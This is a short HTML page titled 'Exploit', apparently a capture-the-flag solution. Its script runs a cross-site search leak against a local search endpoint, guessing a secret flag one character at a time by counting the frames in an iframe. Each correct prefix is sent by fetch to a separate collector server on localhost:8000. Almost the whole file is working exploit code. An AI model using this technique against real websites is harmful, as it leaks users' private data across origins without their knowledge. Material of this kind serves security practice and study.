<!DOCTYPE html>
<?php
 echo "attacking";
?>
<html>

<head>
    <title>Exploit</title>
</head>

<body></body>
<script>
var chars = '0123456789abcdefghijklmnopqrstuvwxyz{}';
var charLen = chars.length;
var ENDPOINT = "http://localhost:10087/search?search="
var x = document.createElement('iframe');

function search(leak, charCounter) {
    var curChar = chars[charCounter]
    x.setAttribute("src", 'http://localhost:10087/search?search=' + leak + curChar);
    document.body.appendChild(x);
    console.log("leak = " + leak + curChar);
    x.onload = () => {
        if (x.contentWindow.frames.length != 0) {
            fetch('http://localhost:8000?leak=' + escape(leak), {
                method: "POST",
                mode: "no-cors",
                credentials: "include"
            });
            leak += curChar
        }
        search(leak, (charCounter + 1) % chars.length);
    }
}

function exploit() {
    search("flag{", 0);
}

exploit();
</script>

</html>